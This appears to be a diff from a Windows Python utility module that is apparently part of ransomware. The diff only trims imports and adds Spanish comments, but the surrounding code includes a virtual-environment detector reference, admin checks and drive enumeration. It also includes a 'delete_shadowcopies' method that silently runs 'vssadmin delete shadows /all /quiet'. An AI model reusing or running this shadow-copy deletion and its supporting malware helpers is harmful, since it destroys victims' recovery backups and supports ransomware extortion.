@@ -1,17 +1,14 @@
 import os
 from re import I
 import sys
-import subprocess
 import oschmod
 import win32api
 import ctypes
 import winreg
 import time
 import requests
-import socket
 from datetime import datetime
 import traceback
-import uuid
 from fsplit.filesplit import Filesplit
 
 
@@ -135,6 +132,7 @@ class Utils:
         except:
             pass
 
+
     # Duplicado en VirtualEnvironmentDetector
     def is_windows(self):
         return os.name == 'nt'
@@ -144,6 +142,7 @@ class Utils:
         return win32api.GetLogicalDriveStrings().split('\000')[:-1]
 
 
+    # Metodos duplicados
     def is_admin(self):
         if self.is_windows():
             try:
@@ -186,7 +185,7 @@ class Utils:
         except:
             pass
     """
-    
+
     def delete_shadowcopies(self):
         try:
             os.system("cmd /c vssadmin delete shadows /all /quiet")
